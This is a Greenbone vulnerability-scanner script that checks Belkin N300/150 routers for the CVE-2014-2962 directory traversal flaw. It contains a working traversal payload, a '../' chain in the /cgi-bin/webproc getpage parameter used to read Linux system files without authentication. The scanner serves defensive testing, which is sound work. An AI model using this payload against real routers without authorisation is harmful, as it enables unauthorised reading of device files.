if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806147" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2014-2962" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-10-29 12:12:25 +0530 (Thu, 29 Oct 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "Belkin Router Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is running Belkin Router and is
  prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read the configuration file or not." );
	script_tag( name: "insight", value: "The flaw allows unauthenticated attackers
  to download arbitrary files through directory traversal." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to read arbitrary files on the target system." );
	script_tag( name: "affected", value: "Belkin N300/150 WiFi N Router, other firmware may also be affected." );
	script_tag( name: "solution", value: "As a workaround ensure that appropriate
  firewall rules are in place to restrict access to port 80/tcp from external
  untrusted sources." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_xref( name: "URL", value: "http://www.kb.cert.org/vuls/id/774788" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/38488" );
	script_xref( name: "URL", value: "http://www.belkin.com/us/support-article?articleNum=109400" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/133913/belkin-disclose.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_keys( "Host/runs_unixoide" );
	script_mandatory_keys( "mini_httpd/banner" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
asport = http_get_port( default: 80 );
banner = http_get_remote_headers( port: asport );
if(!banner){
	exit( 0 );
}
files = traversal_files( "linux" );
if(IsMatchRegexp( banner, "Server: mini_httpd" )){
	for pattern in keys( files ) {
		file = files[pattern];
		url = "/cgi-bin/webproc?getpage=../../../../../../../../../../" + file + "&" + "var:getpage=html/index.html&var:language=en_us&var:oldpage=(null)&" + "var:page=login";
		if(http_vuln_check( port: asport, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: asport, url: url );
			security_message( port: asport, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

